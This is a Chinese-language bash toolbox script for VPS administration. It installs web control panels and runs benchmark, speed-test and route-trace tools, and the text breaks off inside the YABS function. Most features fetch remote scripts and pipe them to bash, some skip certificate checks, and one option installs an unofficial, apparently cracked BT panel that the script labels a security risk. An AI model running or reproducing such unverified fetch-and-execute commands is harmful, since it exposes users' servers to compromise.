#!/bin/bash

# ============================================
# YLShell 工具箱主脚本 v3.0 (完整功能版)
# 包含所有完整功能，可直接使用
# ============================================

# 严格模式设置
set -euo pipefail
IFS=$'\n\t'

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'
UNDERLINE='\033[4m'
# GitHub 代理列表（按优先级排序）
GITHUB_PROXIES=(
    "https://gh-proxy.com/"
    "https://hk.gh-proxy.com/"
    "https://ghproxy.net/"
    "https://ghfast.top/"
)
WORKING_GITHUB_PROXY=""  # 缓存当前可用代理
# 全局配置
TOOLBOX_VERSION="3.0"
CONFIG_FILE="$HOME/.shell_toolbox_config"
LOG_FILE="$HOME/toolbox_operations.log"
BACKUP_DIR="$HOME/toolbox_backups"
ERROR_LOG="$HOME/toolbox_errors.log"
LOCK_FILE="/tmp/toolbox.lock"
OS_NAME=""
OS_ID=""
PKG_MANAGER=""
PKG_INSTALL=""
PKG_UPDATE=""
SCRIPT_PATH=$(readlink -f "$0")   # 脚本自身绝对路径
SCAN_RESULTS_DIR="$HOME/scan_results"
EFFICIENCY_ALIASES_FILE="$HOME/.toolbox_aliases"

# ==================== 工具函数 ====================
# 检测当前服务器是否需要使用代理（国内服务器或无法访问 GitHub）
check_need_proxy() {
    # 如果环境变量中强制不使用代理，则跳过
    if [ "${GITHUB_NO_PROXY:-0}" = "1" ]; then
        return 1
    fi
    
    # 测试能否直接访问 GitHub（超时3秒）
    if curl -s --connect-timeout 3 https://github.com > /dev/null 2>&1; then
        # 能直接访问，不需要代理
        return 1
    else
        # 无法访问，需要代理
        echo -e "${YELLOW}检测到无法直接访问 GitHub，将使用国内代理加速${NC}" >&2
        return 0
    fi
}
# 获取当前可用的第一个代理（带缓存）
get_working_proxy() {
    if [ -n "$WORKING_GITHUB_PROXY" ]; then
        echo "$WORKING_GITHUB_PROXY"
        return 0
    fi
    
    for proxy in "${GITHUB_PROXIES[@]}"; do
        if curl -s --connect-timeout 5 -I "${proxy}" > /dev/null 2>&1; then
            WORKING_GITHUB_PROXY="$proxy"
            echo "$proxy"
            return 0
        fi
    done
    
    # 如果没有可用代理，返回第一个作为备选
    WORKING_GITHUB_PROXY="${GITHUB_PROXIES[0]}"
    echo "$WORKING_GITHUB_PROXY"
    return 1
}

download_with_fallback() {
    local url="$1"
    local output="${2:-}"
    local temp_output=""
    local use_stdout=false
    local success=false
    local try_urls=("$url")
    
    # 如果是 GitHub 链接，准备代理尝试列表
    if [[ "$url" =~ ^https?://(raw\.)?(githubusercontent\.com|github\.com) ]]; then
        if check_need_proxy; then
            # 需要代理：获取当前可用代理
            local proxy=$(get_working_proxy)
            try_urls+=("${proxy}${url}")
            # 如果缓存代理不是第一个，再补充第一个作为备选
            if [ "$proxy" != "${GITHUB_PROXIES[0]}" ]; then
                try_urls+=("${GITHUB_PROXIES[0]}${url}")
            fi
        else
            # 不需要代理，但添加一个备选镜像以防直连不稳定
            try_urls+=("${GITHUB_PROXIES[0]}${url}")
        fi
    fi
    
    # 处理输出参数
    if [ -z "$output" ]; then
        temp_output=$(mktemp)
        output="$temp_output"
    elif [ "$output" = "-" ]; then
        use_stdout=true
        temp_output=$(mktemp)
        output="$temp_output"
    fi
    
    # 依次尝试下载
    for try_url in "${try_urls[@]}"; do
        echo -e "${CYAN}尝试下载: $try_url${NC}" >&2
        if curl -sSL --connect-timeout 10 --retry 2 "$try_url" -o "$output" 2>/dev/null; then
            success=true
            break
        fi
    done
    
    if [ "$success" = false ]; then
        echo -e "${RED}下载失败: $url${NC}" >&2
        [ -n "$temp_output" ] && rm -f "$temp_output"
        return 1
    fi
    
    if [ "$use_stdout" = true ]; then
        cat "$output"
        rm -f "$output"
    elif [ -n "$temp_output" ]; then
        echo "$temp_output"
    fi
    return 0
}
# 初始化工具箱
init_toolbox() {
    local lock_pid
    if [ -f "$LOCK_FILE" ]; then
        lock_pid=$(cat "$LOCK_FILE" 2>/dev/null)
        if kill -0 "$lock_pid" 2>/dev/null; then
            if ps -p "$lock_pid" -o cmd= 2>/dev/null | grep -q "shell.sh\|toolbox"; then
                echo -e "${RED}YLShell工具箱已在运行 (PID: $lock_pid)${NC}"
                echo -e "${YELLOW}如果确定未运行，请手动删除锁文件: sudo rm -f $LOCK_FILE${NC}"
                exit 1
            else
                echo -e "${YELLOW}发现残留的无效锁文件(PID: $lock_pid)，正在清理...${NC}"
                rm -f "$LOCK_FILE"
            fi
        else
            echo -e "${YELLOW}清理过期的锁文件...${NC}"
            rm -f "$LOCK_FILE"
        fi
    fi
    echo $$ > "$LOCK_FILE"

    trap 'cleanup_on_exit' EXIT INT TERM
    mkdir -p "$BACKUP_DIR" "$SCAN_RESULTS_DIR"
    touch "$LOG_FILE" "$ERROR_LOG" 2>/dev/null || true
    chmod 600 "$LOG_FILE" "$ERROR_LOG" 2>/dev/null || true
    detect_os
    # 新增：配置 Git 代理
    setup_git_proxy


    if ! command -v curl &> /dev/null && ! command -v wget &> /dev/null; then
        echo -e "${YELLOW}提示: curl 或 wget 未安装，部分下载功能可能不可用。${NC}"
    fi
}

# 检测操作系统
detect_os() {
    if [ -f /etc/os-release ]; then
        source /etc/os-release
        OS_NAME="$NAME"
        OS_ID="$ID"
        OS_VERSION="$VERSION_ID"
    elif [ -f /etc/redhat-release ]; then
        OS_NAME=$(cat /etc/redhat-release)
        OS_ID="rhel"
    elif [ -f /etc/debian_version ]; then
        OS_NAME="Debian $(cat /etc/debian_version)"
        OS_ID="debian"
    else
        OS_NAME="Unknown"
        OS_ID="unknown"
    fi

    if command -v apt &> /dev/null; then
        PKG_MANAGER="apt"
        PKG_INSTALL="sudo apt install -y"
        PKG_UPDATE="sudo apt update"
    elif command -v yum &> /dev/null; then
        PKG_MANAGER="yum"
        PKG_INSTALL="sudo yum install -y"
        PKG_UPDATE="sudo yum check-update || true"
    elif command -v dnf &> /dev/null; then
        PKG_MANAGER="dnf"
        PKG_INSTALL="sudo dnf install -y"
        PKG_UPDATE="sudo dnf check-update || true"
    elif command -v pacman &> /dev/null; then
        PKG_MANAGER="pacman"
        PKG_INSTALL="sudo pacman -S --noconfirm"
        PKG_UPDATE="sudo pacman -Sy"
    else
        PKG_MANAGER="unknown"
        PKG_INSTALL="echo '请手动安装: '"
    fi
}

# 清理函数
cleanup_on_exit() {
    restore_git_proxy          # 恢复 Git 代理配置
    [ -f "$LOCK_FILE" ] && rm -f "$LOCK_FILE"
    echo -e "${GREEN}YLShell工具箱已退出${NC}"
}

# 显示标题
show_header() {
    clear
    echo -e "${CYAN}============================================${NC}"
    echo -e "${BOLD}${PURPLE}        YLShell工具箱 v$TOOLBOX_VERSION${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo ""
}

# 确认对话框
confirm_action() {
    local message="$1"
    local default="${2:-n}"

    if [ "$default" = "y" ]; then
        read -p "$message (Y/n): " -n 1 -r
        echo
        [[ $REPLY =~ ^[Nn]$ ]] && return 1
    else
        read -p "$message (y/N): " -n 1 -r
        echo
        [[ $REPLY =~ ^[Yy]$ ]] || return 1
    fi

    return 0
}

# 日志记录
log_operation() {
    local action="$1"
    local details="$2"
    local status="${3:-INFO}"
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $action - $details - $status" >> "$LOG_FILE"
}

# 错误处理
handle_error() {
    local error_msg="$1"
    echo -e "${RED}错误: $error_msg${NC}" >&2
    echo "$(date) - ERROR - $error_msg" >> "$ERROR_LOG"
}

# 检查并安装依赖工具
check_and_install_deps() {
    local tools=("$@")
    local missing=()
    
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing+=("$tool")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}缺少依赖工具: ${missing[*]}${NC}"
        if confirm_action "是否安装这些工具？" "y"; then
            eval "$PKG_INSTALL ${missing[*]}"
        else
            echo -e "${RED}部分功能可能无法正常工作${NC}"
            return 1
        fi
    fi
    return 0
}

# ==================== 面板安装模块 ====================
panel_install_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}面板安装中心${NC}"
        echo -e "${BLUE}1.${NC} 宝塔面板官方版"
        echo -e "${BLUE}2.${NC} 宝塔面板国际版 (aapanel)"
        echo -e "${BLUE}3.${NC} 宝塔面板开心版"
        echo -e "${BLUE}4.${NC} 1Panel 面板"
        echo -e "${BLUE}5.${NC} X-UI 面板"
        echo -e "${BLUE}6.${NC} HestiaCP 面板"
        echo -e "${BLUE}7.${NC} CyberPanel 面板"
        echo -e "${BLUE}8.${NC} Webmin 面板"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        echo ""
        read -p "请选择操作: " choice

        case $choice in
            1) install_baota_official ;;
            2) install_baota_international ;;
            3) install_baota_happy ;;
            4) install_1panel ;;
            5) install_xui ;;
            6) install_hestiacp ;;
            7) install_cyberpanel ;;
            8) install_webmin ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac

        if [ "$choice" -ne 0 ] 2>/dev/null; then
            echo ""
            read -p "按回车键继续..."
        fi
    done
}

install_baota_happy() {
    echo -e "${BOLD}安装宝塔面板开心版${NC}"
    echo -e "${RED}========================================${NC}"
    echo -e "${YELLOW}警告: 此为非官方版本，存在安全风险${NC}"
    echo -e "${YELLOW}请谨慎使用，不建议用于生产环境${NC}"
    echo -e "${RED}========================================${NC}"

    if ! confirm_action "确认安装宝塔面板开心版？" "n"; then
        return
    fi

    echo "选择开心版版本:"
    echo "1. 标准开心版(推荐)"
    echo "2. 纯净版"
    echo "3. 7.7经典版"
    read -p "请选择: " version_choice

    case $version_choice in
        1)
            echo -e "${CYAN}安装标准开心版...${NC}"
            local install_cmd="if [ -f /usr/bin/curl ];then curl -sSO https://io.bt.sb/install/install_latest.sh;else wget -O install_latest.sh https://io.bt.sb/install/install_latest.sh;fi;bash install_latest.sh"
            eval "$install_cmd"
            ;;
        2)
            echo -e "${CYAN}安装纯净版...${NC}"
            local script_file
            script_file=$(download_with_fallback "https://raw.githubusercontent.com/zhucaidan/btpanel-v7.7.0/main/install/install.sh")
            if [ $? -eq 0 ] && [ -n "$script_file" ]; then
                bash "$script_file"
                rm -f "$script_file"
            else
                handle_error "下载纯净版脚本失败"
                return
            fi
            ;;
        3)
            echo -e "${CYAN}安装7.7经典版...${NC}"
            local script_file
            script_file=$(download_with_fallback "https://raw.githubusercontent.com/ztkink/bthappy/main/install/install_6.0.sh")
            if [ $? -eq 0 ] && [ -n "$script_file" ]; then
                bash "$script_file"
                rm -f "$script_file"
            else
                handle_error "下载7.7经典版脚本失败"
                return
            fi
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}宝塔开心版安装完成！${NC}"
        log_operation "安装宝塔开心版" "版本: $version_choice" "SUCCESS"
    else
        handle_error "安装失败"
    fi
}

install_baota_official() {
    echo -e "${BOLD}安装宝塔面板官方版${NC}"

    if ! confirm_action "确认安装宝塔官方版？" "n"; then
        return
    fi

    local install_cmd=""
    case "$OS_ID" in
        centos|rhel|fedora)
            install_cmd="yum install -y wget && wget -O install.sh https://download.bt.cn/install/install_6.0.sh && sh install.sh"
            ;;
        ubuntu|debian)
            install_cmd="wget -O install.sh https://download.bt.cn/install/install-ubuntu_6.0.sh && sudo bash install.sh"
            ;;
        *)
            echo -e "${YELLOW}不支持的系统，尝试通用安装...${NC}"
            install_cmd="curl -sSO https://download.bt.cn/install/install_6.0.sh && bash install_6.0.sh"
            ;;
    esac

    echo -e "${CYAN}开始安装...${NC}"
    if eval "$install_cmd"; then
        echo -e "${GREEN}宝塔官方版安装完成！${NC}"
        log_operation "安装宝塔官方版" "成功" "SUCCESS"
    else
        handle_error "安装失败"
    fi
}

install_baota_international() {
    echo -e "${BOLD}安装宝塔面板国际版 (aapanel)${NC}"

    if ! confirm_action "确认安装宝塔国际版？" "n"; then
        return
    fi

    local install_cmd=""
    case "$OS_ID" in
        centos|rhel|fedora)
            install_cmd="yum install -y wget && wget -O install.sh http://www.aapanel.com/script/install_6.0_en.sh && bash install.sh"
            ;;
        ubuntu|debian)
            install_cmd="wget -O install.sh http://www.aapanel.com/script/install-ubuntu_6.0_en.sh && sudo bash install.sh"
            ;;
        *)
            echo -e "${YELLOW}不支持的系统，尝试通用安装...${NC}"
            install_cmd="curl -sSO http://www.aapanel.com/script/install_6.0_en.sh && bash install_6.0_en.sh"
            ;;
    esac

    echo -e "${CYAN}开始安装...${NC}"
    if eval "$install_cmd"; then
        echo -e "${GREEN}宝塔国际版安装完成！${NC}"
        log_operation "安装宝塔国际版" "成功" "SUCCESS"
    else
        handle_error "安装失败"
    fi
}

install_1panel() {
    echo -e "${BOLD}安装1Panel面板${NC}"

    if ! confirm_action "确认安装1Panel？" "n"; then
        return
    fi

    echo -e "${CYAN}下载安装脚本...${NC}"
    curl -sSL https://resource.fit2cloud.com/1panel/package/quick_start.sh -o quick_start.sh

    if [ -f "quick_start.sh" ]; then
        chmod +x quick_start.sh
        echo -e "${CYAN}开始安装...${NC}"
        sudo bash quick_start.sh

        if [ $? -eq 0 ]; then
            echo -e "${GREEN}1Panel安装完成！${NC}"
            log_operation "安装1Panel" "成功" "SUCCESS"
        else
            handle_error "1Panel安装失败"
        fi

        rm -f quick_start.sh
    else
        handle_error "下载安装脚本失败"
    fi
}

install_xui() {
    echo -e "${BOLD}安装X-UI面板${NC}"

    if ! confirm_action "确认安装X-UI？" "n"; then
        return
    fi

    echo -e "${CYAN}开始安装...${NC}"
    local script_file
    script_file=$(download_with_fallback "https://raw.githubusercontent.com/vaxilu/x-ui/master/install.sh")
    if [ $? -eq 0 ] && [ -n "$script_file" ]; then
        bash "$script_file"
        rm -f "$script_file"
        echo -e "${GREEN}X-UI安装完成！${NC}"
        echo -e "${CYAN}面板地址: http://服务器IP:54321${NC}"
        log_operation "安装X-UI" "成功" "SUCCESS"
    else
        handle_error "X-UI安装失败"
    fi
}

install_hestiacp() {
    echo -e "${BOLD}安装HestiaCP面板${NC}"

    if ! confirm_action "确认安装HestiaCP？" "n"; then
        return
    fi

    echo -e "${CYAN}下载安装脚本...${NC}"
    local script_file
    script_file=$(download_with_fallback "https://raw.githubusercontent.com/hestiacp/hestiacp/release/install/hst-install.sh")
    if [ $? -eq 0 ] && [ -n "$script_file" ]; then
        chmod +x "$script_file"
        sudo bash "$script_file"
        rm -f "$script_file"
        echo -e "${GREEN}HestiaCP安装完成！${NC}"
        log_operation "安装HestiaCP" "成功" "SUCCESS"
    else
        handle_error "HestiaCP安装失败"
    fi
}

install_cyberpanel() {
    echo -e "${BOLD}安装CyberPanel面板${NC}"

    if ! confirm_action "确认安装CyberPanel？" "n"; then
        return
    fi

    echo -e "${CYAN}下载预安装脚本...${NC}"
    local pre_script
    pre_script=$(download_with_fallback "https://raw.githubusercontent.com/usmannasir/cyberpanel/stable/preInstall.sh")
    if [ $? -eq 0 ] && [ -n "$pre_script" ]; then
        bash "$pre_script"
        rm -f "$pre_script"
    else
        handle_error "下载预安装脚本失败"
        return
    fi

    echo -e "${CYAN}下载主安装脚本...${NC}"
    local install_script
    install_script=$(download_with_fallback "https://raw.githubusercontent.com/usmannasir/cyberpanel/stable/installCyberPanel.sh")
    if [ $? -eq 0 ] && [ -n "$install_script" ]; then
        bash "$install_script"
        rm -f "$install_script"
        echo -e "${GREEN}CyberPanel安装完成！${NC}"
        log_operation "安装CyberPanel" "成功" "SUCCESS"
    else
        handle_error "下载主安装脚本失败"
    fi
}

install_webmin() {
    echo -e "${BOLD}安装Webmin面板${NC}"

    if ! confirm_action "确认安装Webmin？" "n"; then
        return
    fi

    case "$PKG_MANAGER" in
        apt)
            echo -e "${CYAN}通过APT安装...${NC}"
            sudo apt update
            sudo apt install -y webmin
            ;;
        yum|dnf)
            echo -e "${CYAN}通过YUM/DNF安装...${NC}"
            sudo tee /etc/yum.repos.d/webmin.repo << EOF
[Webmin]
name=Webmin Distribution Neutral
baseurl=https://download.webmin.com/download/yum
enabled=1
EOF
            sudo rpm --import https://download.webmin.com/jcameron-key.asc && \
            sudo yum install -y webmin || echo -e "${RED}Webmin安装失败，请检查网络或密钥${NC}"
            ;;
        *)
            echo -e "${YELLOW}不支持的系统，尝试手动安装...${NC}"
            wget https://prdownloads.sourceforge.net/webadmin/webmin-2.000-1.noarch.rpm
            sudo rpm -U webmin-2.000-1.noarch.rpm
            ;;
    esac

    if command -v webmin &> /dev/null || systemctl is-active --quiet webmin; then
        echo -e "${GREEN}Webmin安装完成！${NC}"
        echo -e "${CYAN}访问地址: https://服务器IP:10000${NC}"
        log_operation "安装Webmin" "成功" "SUCCESS"
    else
        handle_error "Webmin安装失败"
    fi
}

# ==================== 服务器测评模块 ====================
benchmark_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}服务器测评中心${NC}"
        echo -e "${CYAN}请选择测试类别:${NC}\n"
        echo -e "${BLUE}1.${NC} 综合性能测试（融合怪/YABS/LemonBench等）"
        echo -e "${BLUE}2.${NC} 硬件性能测试（UnixBench/GB5/内存/磁盘）"
        echo -e "${BLUE}3.${NC} 网络速度测试（全球/国内测速）"
        echo -e "${BLUE}4.${NC} 路由追踪与回程测试"
        echo -e "${BLUE}5.${NC} 流媒体解锁检测"
        echo -e "${BLUE}6.${NC} 原有功能（快速入口）"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        echo ""
        read -p "请选择类别: " cat_choice

        case $cat_choice in
            1) benchmark_comprehensive ;;
            2) benchmark_performance ;;
            3) benchmark_network ;;
            4) benchmark_route ;;
            5) test_media_unlock ;;   # 原有流媒体检测
            6) benchmark_legacy ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac
    done
}
benchmark_comprehensive() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}综合性能测试${NC}\n"
        echo -e "${BLUE}1.${NC} 融合怪超级测评（系统/网络/流媒体）"
        echo -e "${BLUE}2.${NC} YABS 性能测试（磁盘/网络/Geekbench）"
        echo -e "${BLUE}3.${NC} LemonBench 快速测试"
        echo -e "${BLUE}4.${NC} Benchy 精简测试"
        echo -e "${BLUE}5.${NC} Bench.Monster 速度测试"
        echo -e "${BLUE}6.${NC} Superbench.sh 增强测试"
        echo -e "${BLUE}7.${NC} Bench.sh 基础测试"
        echo -e "${BLUE}0.${NC} 返回上级"
        echo ""
        read -p "请选择测试项: " choice

        case $choice in
            1) run_ecs_benchmark ;;      # 已存在
            2) run_yabs ;;                # 已存在
            3) run_lemonbench ;;
            4) run_benchy ;;
            5) run_benchmonster ;;
            6) run_superbench ;;
            7) run_bench_sh ;;            # 已存在
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac

        if [ "$choice" -ne 0 ] 2>/dev/null; then
            echo ""
            read -p "按回车键继续..."
        fi
    done
}

# 新增函数
run_lemonbench() {
    echo -e "${BOLD}LemonBench 快速测试${NC}"
    echo -e "${CYAN}此脚本将执行系统信息、CPU/内存/磁盘性能测试${NC}"
    if ! confirm_action "开始测试？" "y"; then return; fi
    bash <(curl -fsL https://raw.githubusercontent.com/LemonBench/LemonBench/main/LemonBench.sh) -s -- --fast
    log_operation "运行LemonBench" "完成" "INFO"
}

run_benchy() {
    echo -e "${BOLD}Benchy 精简测试${NC}"
    echo -e "${CYAN}YABS的轻量版，输出简洁的系统信息和性能数据${NC}"
    if ! confirm_action "开始测试？" "y"; then return; fi
    curl -Ls benchy.pw | sh
    log_operation "运行Benchy" "完成" "INFO"
}

run_benchmonster() {
    echo -e "${BOLD}Bench.Monster 速度测试${NC}"
    echo -e "${CYAN}包含系统信息、I/O和全球速度测试${NC}"
    if ! confirm_action "开始测试？" "y"; then return; fi
    curl -sL bench.monster | bash
    log_operation "运行Bench.Monster" "完成" "INFO"
}

run_superbench() {
    echo -e "${BOLD}Superbench.sh 增强测试${NC}"
    echo -e "${CYAN}包含基础信息、国内三网速度、Geekbench和流媒体检测${NC}"
    if ! confirm_action "开始测试？" "y"; then return; fi
    bash <(wget -qO- https://down.vpsaff.net/linux/speedtest/superbench.sh)
    log_operation "运行Superbench.sh" "完成" "INFO"
}
benchmark_performance() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}硬件性能测试${NC}\n"
        echo -e "${BLUE}1.${NC} UnixBench 跑分（CPU/内存/系统调用）"
        echo -e "${BLUE}2.${NC} Geekbench 5 跑分"
        echo -e "${BLUE}3.${NC} memoryCheck 内存超售检测"
        echo -e "${BLUE}4.${NC} 硬盘性能/通电时间检测（独服专用）"
        echo -e "${BLUE}5.${NC} 磁盘IO测试（快速/详细）"
        echo -e "${BLUE}0.${NC} 返回上级"
        echo ""
        read -p "请选择测试项: " choice

        case $choice in
            1) run_unixbench ;;
            2) run_geekbench ;;          # 已存在
            3) run_memorycheck ;;
            4) run_disk_test ;;
            5) test_disk_io ;;            # 已存在
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac

        if [ "$choice" -ne 0 ] 2>/dev/null; then
            echo ""
            read -p "按回车键继续..."
        fi
    done
}

run_unixbench() {
    echo -e "${BOLD}UnixBench 跑分${NC}"
    echo -e "${YELLOW}注意：测试时间较长（10-30分钟），请耐心等待${NC}"
    if ! confirm_action "开始 UnixBench 测试？" "n"; then return; fi
    wget --no-check-certificate https://github.com/teddysun/across/raw/master/unixbench.sh
    chmod +x unixbench.sh
    ./unixbench.sh
    rm -f unixbench.sh
    log_operation "运行UnixBench" "完成" "INFO"
}

run_memorycheck() {
    echo -e "${BOLD}memoryCheck 内存超售检测${NC}"
    echo -e "${CYAN}检测Swap、Balloon、KSM等内存超售情况${NC}"
    if ! confirm_action "开始检测？" "y"; then return; fi
    curl https://raw.githubusercontent.com/uselibrary/memoryCheck/main/memoryCheck.sh | bash
    log_operation "运行memoryCheck" "完成" "INFO"
}

run_disk_test() {
    echo -e "${BOLD}硬盘性能/通电时间检测（独立服务器）${NC}"
    echo -e "${YELLOW}如果是VPS，可能只显示基本信息${NC}"
    if ! confirm_action "开始检测？" "y"; then return; fi
    bash <(wget -qO- git.io/ceshi)
    log_operation "运行硬盘检测" "完成" "INFO"
}
benchmark_network() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}网络速度测试${NC}\n"
        echo -e "${BLUE}1.${NC} network-speed.xyz（全球节点，流量消耗大）"
        echo -e "${BLUE}2.${NC} i-abc Speedtest（多功能测速）"
        echo -e "${BLUE}3.${NC} HyperSpeed（国内三网测速）"
        echo -e "${BLUE}4.${NC} 三网测速（原superspeed）"
        echo -e "${BLUE}5.${NC} Speedtest-cli（Ookla官方）"
        echo -e "${BLUE}0.${NC} 返回上级"
        echo ""
        read -p "请选择测试项: " choice

        case $choice in
            1) run_network_speed_xyz ;;
            2) run_iabc_speedtest ;;
            3) run_hyperspeed ;;
            4) run_superspeed ;;         # 已存在
            5) speed_test ;;              # 已存在（网络工具中的速度测试）
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac

        if [ "$choice" -ne 0 ] 2>/dev/null; then
            echo ""
            read -p "按回车键继续..."
        fi
    done
}

run_network_speed_xyz() {
    echo -e "${BOLD}network-speed.xyz 全球测速${NC}"
    echo -e "${RED}警告：完整测试可能消耗90G以上流量，VPS请谨慎！${NC}"
    echo "请选择测试区域："
    echo "1. 全球（默认，消耗巨大）"
    echo "2. 中国（仅国内节点）"
    echo "3. 亚洲"
    read -p "请选择: " region
    case $region in
        2) cmd="bash -s -- -r china" ;;
        3) cmd="bash -s -- -r asia" ;;
        *) cmd="" ;;
    esac
    if ! confirm_action "开始测试？" "n"; then return; fi
    curl -sL network-speed.xyz | $cmd
    log_operation "运行network-speed.xyz" "区域: $region" "INFO"
}

run_iabc_speedtest() {
    echo -e "${BOLD}i-abc Speedtest 多功能测速${NC}"
    if ! confirm_action "开始测试？" "y"; then return; fi
    bash <(curl -sL bash.icu/speedtest)
    log_operation "运行i-abc Speedtest" "完成" "INFO"
}

run_hyperspeed() {
    echo -e "${BOLD}HyperSpeed 国内三网测速${NC}"
    if ! confirm_action "开始测试？" "y"; then return; fi
    bash <(wget -qO- https://bench.im/hyperspeed)
    log_operation "运行HyperSpeed" "完成" "INFO"
}
benchmark_route() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}路由追踪与回程测试${NC}\n"
        echo -e "${BLUE}1.${NC} 三网回程路由检测（zhanghanyun/backtrace）"
        echo -e "${BLUE}2.${NC} mtr_trace 三网回程检测"
        echo -e "${BLUE}3.${NC} AutoTrace 路由追踪（支持指定IP）"
        echo -e "${BLUE}4.${NC} NextTrace 可视化路由"
        echo -e "${BLUE}5.${NC} 路由追踪（传统traceroute）"
        echo -e "${BLUE}0.${NC} 返回上级"
        echo ""
        read -p "请选择测试项: " choice

        case $choice in
            1) run_backtrace ;;
            2) run_mtr_trace ;;
            3) run_autotrace ;;
            4) run_nexttrace ;;
            5) test_trace_route ;;       # 已存在
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac

        if [ "$choice" -ne 0 ] 2>/dev/null; then
            echo ""
            read -p "按回车键继续..."
        fi
    done
}

run_backtrace() {
    echo -e "${BOLD}三网回程路由检测 (zhanghanyun/backtrace)${NC}"
    if ! confirm_action "开始检测？" "y"; then return; fi
    curl https://raw.githubusercontent.com/zhanghanyun/backtrace/main/install.sh -sSf | sh
    log_operation "运行backtrace" "完成" "INFO"
}

run_mtr_trace() {
    echo -e "${BOLD}mtr_trace 三网回程检测${NC}"
    if ! confirm_action "开始检测？" "y"; then return; fi
    curl https://raw.githubusercontent.com/zhucaidan/mtr_trace/main/mtr_trace.sh | bash
    log_operation "运行mtr_trace" "完成" "INFO"
}

run_autotrace() {
    echo -e "${BOLD}AutoTrace 路由追踪${NC}"
    read -p "输入目标IP或域名（留空自动检测本机回程）: " target
    local cmd=""
    if [ -n "$target" ]; then
        cmd="--target $target"
    fi
    if ! confirm_action "开始追踪？" "y"; then return; fi
    wget -N --no-check-certificate https://raw.githubusercontent.com/Chennhaoo/Shell_Bash/master/AutoTrace.sh && chmod +x AutoTrace.sh
    ./AutoTrace.sh $cmd
    rm -f AutoTrace.sh
    log_operation "运行AutoTrace" "目标: ${target:-本机}" "INFO"
}

run_nexttrace() {
    echo -e "${BOLD}NextTrace 可视化路由${NC}"
    if ! confirm_action "安装并运行 NextTrace？" "y"; then return; fi
    bash <(curl -Ls https://raw.githubusercontent.com/sjlleo/nexttrace/main/nt_install.sh)
    nexttrace -F -T
    log_operation "运行NextTrace" "完成" "INFO"
}
benchmark_legacy() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}原有功能快速入口${NC}\n"
        echo -e "${BLUE}1.${NC} 融合怪超级测评"
        echo -e "${BLUE}2.${NC} Bench.sh 基础测评"
        echo -e "${BLUE}3.${NC} YABS 性能测试"
        echo -e "${BLUE}4.${NC} 三网测速"
        echo -e "${BLUE}5.${NC} 流媒体解锁检测"
        echo -e "${BLUE}6.${NC} 磁盘IO测试"
        echo -e "${BLUE}7.${NC} 路由追踪测试"
        echo -e "${BLUE}8.${NC} Geekbench 跑分"
        echo -e "${BLUE}0.${NC} 返回上级"
        echo ""
        read -p "请选择: " choice

        case $choice in
            1) run_ecs_benchmark ;;
            2) run_bench_sh ;;
            3) run_yabs ;;
            4) run_superspeed ;;
            5) test_media_unlock ;;
            6) test_disk_io ;;
            7) test_trace_route ;;
            8) run_geekbench ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac

        if [ "$choice" -ne 0 ] 2>/dev/null; then
            echo ""
            read -p "按回车键继续..."
        fi
    done
}
run_ecs_benchmark() {
    echo -e "${BOLD}运行融合怪超级测评${NC}"
    echo -e "${CYAN}包含系统信息、网络测速、流媒体解锁等全面测试${NC}"

    if ! confirm_action "运行融合怪测评会消耗流量和时间，确认继续？" "n"; then
        return
    fi

    echo -e "${CYAN}下载测评脚本...${NC}"
    local sources=(
        "https://gitlab.com/spiritysdx/za/-/raw/main/ecs.sh"
        "https://raw.githubusercontent.com/spiritLHLS/ecs/main/ecs.sh"
        "https://cdn.jsdelivr.net/gh/spiritLHLS/ecs/ecs.sh"
    )

    local downloaded=0
    local script_file=""
    for source in "${sources[@]}"; do
        echo -e "${CYAN}尝试从: $source${NC}"
        script_file=$(download_with_fallback "$source")
        if [ $? -eq 0 ] && [ -n "$script_file" ]; then
            downloaded=1
            echo -e "${GREEN}下载成功${NC}"
            break
        fi
    done

    if [ $downloaded -eq 1 ]; then
        chmod +x "$script_file"
        echo -e "${CYAN}开始测评，请耐心等待...${NC}"
        echo -e "${YELLOW}这可能需要5-15分钟${NC}"
        bash "$script_file"
        rm -f "$script_file"
        echo -e "${GREEN}融合怪测评完成！${NC}"
        log_operation "运行融合怪测评" "成功" "SUCCESS"
    else
        handle_error "所有下载源都失败"
    fi
}

run_bench_sh() {
    echo -e "${BOLD}运行Bench.sh基础测评${NC}"

    if ! confirm_action "运行Bench.sh测评？" "n"; then
        return
    fi

    echo -e "${CYAN}开始测试...${NC}"
    curl -Lso- bench.sh | bash
    log_operation "运行Bench.sh" "完成" "INFO"
}

run_yabs() {
    echo -e "${BOLD}运行YABS性能测试${NC}"

    if ! confirm_action "运行YABS测试？" "n"; then
        return
    fi

    echo -e "${CYAN}下载YABS脚本...${NC}"
    local script_file
    script_file=$(download_with_fallback "https://yabs.sh")
    if [ $? -eq 0 ] && [ -n "$script_file" ]; then
        chmod +x "$script_file"
        echo -e "${CYAN}开始测试...${NC}"
        bash "$script_file"
